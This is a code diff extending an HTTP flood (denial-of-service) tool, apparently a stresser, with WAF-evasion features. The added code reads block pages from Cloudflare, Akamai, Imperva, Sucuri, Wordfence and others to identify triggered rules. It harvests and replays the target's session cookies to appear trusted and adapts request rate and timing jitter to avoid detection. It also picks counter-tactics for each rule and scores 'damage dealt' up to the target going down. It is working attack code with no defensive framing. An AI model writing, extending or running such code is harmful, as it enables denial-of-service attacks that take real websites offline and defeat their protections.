@@ -1229,7 +1229,12 @@ class AsyncHttpFlood(Thread):
                 "Sec-Fetch-Mode": "navigate",
                 "Priority": "u=0, i",
             }
-            if hasattr(self, '_cf_clearance') and self._cf_clearance:
+            # Inject all harvested cookies + cf_clearance for maximum trust
+            if hasattr(self, '_chaos_get_cookie_header'):
+                cookie_str = self._chaos_get_cookie_header()
+                if cookie_str:
+                    headers["Cookie"] = cookie_str
+            elif hasattr(self, '_cf_clearance') and self._cf_clearance:
                 headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
             
             try:
@@ -1768,7 +1773,12 @@ class HttpFlood(Thread):
             # Add realistic referer from session journey
             if hasattr(self, '_chaos_get_smart_referer'):
                 headers["Referer"] = self._chaos_get_smart_referer()
-            if hasattr(self, '_cf_clearance') and self._cf_clearance:
+            # Inject all harvested cookies + cf_clearance for maximum trust
+            if hasattr(self, '_chaos_get_cookie_header'):
+                cookie_str = self._chaos_get_cookie_header()
+                if cookie_str:
+                    headers["Cookie"] = cookie_str
+            elif hasattr(self, '_cf_clearance') and self._cf_clearance:
                 headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
                 
             for _ in range(self._rpc):
@@ -2592,6 +2602,14 @@ class HttpFlood(Thread):
         "cached_paths": [],        # Paths that returned cache-hit (useless to attack)
         "uncached_paths": [],      # Paths that bypass cache (valuable targets)
         "content_type_rotation": 0, # Rotate POST content types
+        "harvested_cookies": {},   # Cookies collected from target responses
+        "waf_block_signatures": [],# Detected WAF block page keywords
+        "waf_rules_triggered": [], # Specific WAF rules we are triggering
+        "adaptive_rpc": 10,        # Dynamic requests-per-connection (auto-tuned)
+        "jitter_ms": 0,            # Current timing jitter between requests
+        "successful_streak": 0,    # Consecutive successful requests
+        "method_timing": {},       # method -> avg execution time in ms
+        "damage_score": 0,         # Estimated total damage dealt to target
     }
     
     # ========================================================================
@@ -2857,6 +2875,172 @@ class HttpFlood(Thread):
     def _chaos_get_browser_profile(self):
         """Select a random complete browser profile for header consistency."""
         return dict(randchoice(self._BROWSER_PROFILES))
+    
+    def _chaos_analyze_block_page(self, response_body):
+        """Analyze WAF block pages to identify exact rules being triggered.
+        This lets us understand WHY we're being blocked and adapt specifically."""
+        intel = self._chaos_intel
+        body = response_body.lower() if response_body else ""
+        
+        # WAF-specific block page signatures
+        signatures = {
+            # Cloudflare
+            "attention required": ("cloudflare", "js_challenge"),
+            "ray id": ("cloudflare", "ray_block"),
+            "enable javascript and cookies": ("cloudflare", "browser_check"),
+            "error 1020": ("cloudflare", "firewall_rule"),
+            "error 1015": ("cloudflare", "rate_limited"),
+            "error 1012": ("cloudflare", "origin_unreachable"),
+            # Akamai
+            "access denied": ("akamai", "access_denied"),
+            "reference #": ("akamai", "ref_block"),
+            # Imperva/Incapsula
+            "incapsula incident": ("imperva", "incident"),
+            "powered by incapsula": ("imperva", "bot_block"),
+            "_incapsula_resource": ("imperva", "resource_check"),
+            # Sucuri
+            "sucuri website firewall": ("sucuri", "waf_block"),
+            "access denied - sucuri": ("sucuri", "access_denied"),
+            # Wordfence
+            "blocked by wordfence": ("wordfence", "rule_block"),
+            "wordfence - firewall": ("wordfence", "firewall"),
+            "your access to this site": ("wordfence", "ip_block"),
+            # ModSecurity
+            "mod_security": ("modsec", "rule_match"),
+            "not acceptable": ("modsec", "406_block"),
+            "request rejected": ("modsec", "rejected"),
+            # AWS WAF
+            "request blocked": ("aws_waf", "blocked"),
+            # DDoS-Guard
+            "ddos-guard": ("ddosguard", "challenge"),
+            # Generic
+            "403 forbidden": ("generic", "forbidden"),
+            "429 too many": ("generic", "rate_limit"),
+            "captcha": ("generic", "captcha_required"),
+        }
+        
+        detected = []
+        for sig, (waf_name, rule_type) in signatures.items():
+            if sig in body:
+                detected.append({"waf": waf_name, "rule": rule_type, "signal": sig})
+                
+        if detected:
+            intel["waf_block_signatures"] = detected
+            # Extract specific rules triggered
+            rules = [d["rule"] for d in detected]
+            intel["waf_rules_triggered"] = rules
+            
+            # Auto-correct WAF type if recon missed it
+            primary_waf = detected[0]["waf"]
+            if intel.get("waf_type") == "none" and primary_waf != "generic":
+                intel["waf_type"] = primary_waf
+                if int(REQUESTS_SENT) < 50:
+                    print(f"{bcolors.WARNING}[CHAOS] WAF re-identified from block page: {primary_waf.upper()}{bcolors.RESET}")
+                    
+        return detected
+    
+    def _chaos_harvest_cookies(self, response_headers):
+        """Collect Set-Cookie headers from target responses for session persistence.
+        Replaying legitimate cookies makes our requests look like returning visitors."""
+        intel = self._chaos_intel
+        if not response_headers:
+            return
+            
+        cookies_raw = response_headers if isinstance(response_headers, str) else str(response_headers)
+        
+        import re
+        cookie_matches = re.findall(r'Set-Cookie:\s*([^;]+)', cookies_raw, re.IGNORECASE)
+        for cookie in cookie_matches:
+            if '=' in cookie:
+                key, val = cookie.split('=', 1)
+                key = key.strip()
+                val = val.strip()
+                # Skip tracking/analytics cookies, keep session cookies
+                skip_prefixes = ['_ga', '_gid', '_fbp', 'utm_']
+                if not any(key.lower().startswith(p) for p in skip_prefixes):
+                    intel["harvested_cookies"][key] = val
+    
+    def _chaos_get_cookie_header(self):
+        """Build a cookie header string from harvested + cf_clearance cookies."""
+        intel = self._chaos_intel
+        cookies = dict(intel.get("harvested_cookies", {}))
+        
+        # Add cf_clearance if available
+        if hasattr(self, '_cf_clearance') and self._cf_clearance:
+            cookies["cf_clearance"] = self._cf_clearance
+            
+        if not cookies:
+            return None
+            
+        return "; ".join(f"{k}={v}" for k, v in cookies.items())
+    
+    def _chaos_adaptive_rate(self):
+        """Dynamically adjust attack rate based on success/block ratio.
+        Smart pacing: slow down when detected, speed up when invisible."""
+        intel = self._chaos_intel
+        
+        # Calculate recent success rate
+        all_history = intel.get("success_history", {})
+        recent_results = []
+        for method, results in all_history.items():
+            recent_results.extend(results[-10:])
+            
+        if len(recent_results) < 5:
+            return  # Not enough data
+            
+        success_rate = sum(recent_results) / len(recent_results)
+        
+        # Adjust RPC (requests per connection)
+        if success_rate > 0.85:
+            # We're invisible. Increase pressure
+            intel["adaptive_rpc"] = min(intel["adaptive_rpc"] + 2, 30)
+            intel["jitter_ms"] = 0  # No need to slow down
+            intel["successful_streak"] += 1
+        elif success_rate > 0.6:
+            # Moderate resistance. Stay steady
+            intel["adaptive_rpc"] = max(min(intel["adaptive_rpc"], 15), 8)
+            intel["jitter_ms"] = randint(10, 50)
+        elif success_rate > 0.3:
+            # Heavy resistance. Slow down significantly
+            intel["adaptive_rpc"] = max(intel["adaptive_rpc"] - 2, 5)
+            intel["jitter_ms"] = randint(50, 200)
+            intel["successful_streak"] = 0
+        else:
+            # Almost fully blocked. Minimal rate
+            intel["adaptive_rpc"] = max(intel["adaptive_rpc"] - 3, 3)
+            intel["jitter_ms"] = randint(200, 500)
+            intel["successful_streak"] = 0
+            
+        # Boost temperature based on streaks
+        if intel["successful_streak"] > 20:
+            intel["temperature"] = min(intel["temperature"] + 0.05, 1.0)
+    
+    def _chaos_calculate_damage(self):
+        """Estimate total damage dealt to target based on observable signals."""
+        intel = self._chaos_intel
+        
+        score = 0
+        # Requests that got through = pressure on server
+        total_success = sum(sum(v) for v in intel.get("success_history", {}).values())
+        score += total_success * 1
+        
+        # Response time increase = server struggling
+        rt_baseline = intel.get("response_time_ms", 500) or 500
+        hp = intel.get("health_history", [])
+        if hp:
+            latest_rt = hp[-1]
+            if latest_rt > rt_baseline * 2:
+                score += (latest_rt - rt_baseline) // 10
+                
+        # 5xx errors = server crashing  
+        score += intel.get("consecutive_5xx", 0) * 50
+        
+        # Target down = maximum damage
+        if intel.get("target_is_down"):
+            score += 1000
+            
+        intel["damage_score"] = score
+        return score
     
     def _chaos_simulate_session(self):
         """Simulate a realistic multi-step user session to build cookie trust.
@@ -3513,6 +3697,45 @@ class HttpFlood(Thread):
                 if m not in ("STEALTH_JA3", "SLOW_V2"):
                     weights[m] = max(int(weights[m] * 0.7), 1)
         
+        # === STRATEGY S: WAF Rule-Specific Counter-Tactics ===
+        rules = intel.get("waf_rules_triggered", [])
+        if "rate_limited" in rules or "rate_limit" in rules or "1015" in str(rules):
+            # WAF is rate limiting. Maximum stealth, minimum volume
+            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 80)
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
+            weights["STRESS"] = 0
+            weights["PPS"] = 0
+        if "js_challenge" in rules or "browser_check" in rules:
+            # JS challenge active. Only TLS-mimicking methods work
+            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 90)
+            weights["GET"] = 1
+            weights["POST"] = 1
+        if "captcha_required" in rules:
+            # Captcha active. Need cf_clearance + stealth
+            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 85)
+            weights["BOT"] = max(weights.get("BOT", 0), 20)
+        if "firewall_rule" in rules or "rule_block" in rules:
+            # Specific firewall rules. Shift away from blocked patterns entirely
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
+            weights["DYN"] = max(weights.get("DYN", 0), 35)
+            weights["COOKIE"] = max(weights.get("COOKIE", 0), 25)
+        
+        # === STRATEGY T: Adaptive RPC Application ===
+        # Apply learned optimal requests-per-connection to avoid detection
+        adaptive_rpc = intel.get("adaptive_rpc", 10)
+        if adaptive_rpc < 5:
+            # Very restricted. Only stealth methods can handle low RPC
+            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 60)
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 40)
+        
+        # === STRATEGY U: Cookie Trust Exploitation ===
+        # If we've harvested cookies, our requests have higher trust
+        if intel.get("harvested_cookies"):
+            # Cookies make all methods more effective
+            weights["COOKIE"] = max(weights.get("COOKIE", 0), 30)
+            weights["POST_DYN"] = int(weights.get("POST_DYN", 0) * 1.2)
+            weights["DYN"] = int(weights.get("DYN", 0) * 1.2)
+        
         # === STRATEGY Q: Cache Bypass Intelligence ===
         # If we've discovered uncached paths, boost POST/DYN methods that use them
         uncached = intel.get("uncached_paths", [])
@@ -3603,6 +3826,15 @@ class HttpFlood(Thread):
         # Phase 1.5: SESSION BUILDING (run once after recon to build trust)
         if intel["total_executions"] == 1:
             self._chaos_simulate_session()
+        
+        # Phase 1.6: AUTO-TUNE attack rate
+        if intel["total_executions"] % 10 == 0:
+            self._chaos_adaptive_rate()
+            
+        # Apply timing jitter (human-like random delay)
+        jitter = intel.get("jitter_ms", 0)
+        if jitter > 0:
+            sleep(jitter / 1000.0)
         
         # Save learned intelligence periodically (every 500 executions)
         if intel["total_executions"] > 0 and intel["total_executions"] % 500 == 0:
@@ -3771,6 +4003,25 @@ class HttpFlood(Thread):
                 eff_str = " | ".join([f"{k}:{v:.0%}" for k, v in sorted(intel.get("efficiency_score", {}).items(), key=lambda x: -x[1])[:5]])
                 if eff_str:
                     print(f"  Efficiency  : {eff_str}")
+                # Damage assessment
+                dmg = self._chaos_calculate_damage() if hasattr(self, '_chaos_calculate_damage') else 0
+                if dmg > 500:
+                    dmg_str = f"{bcolors.OKGREEN}CRITICAL ({dmg}){bcolors.RESET}"
+                elif dmg > 200:
+                    dmg_str = f"{bcolors.WARNING}HEAVY ({dmg}){bcolors.RESET}"
+                elif dmg > 50:
+                    dmg_str = f"{bcolors.OKCYAN}MODERATE ({dmg}){bcolors.RESET}"
+                else:
+                    dmg_str = f"LIGHT ({dmg})"
+                print(f"  Damage Dealt: {dmg_str}")
+                print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
+                # Show WAF rules detected
+                rules = intel.get("waf_rules_triggered", [])
+                if rules:
+                    print(f"  WAF Rules   : {bcolors.FAIL}{', '.join(rules[:5])}{bcolors.RESET}")
+                cookies_count = len(intel.get("harvested_cookies", {}))
+                if cookies_count:
+                    print(f"  Cookies     : {cookies_count} harvested (trust level: HIGH)")
                 print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                 print(f"")
                 
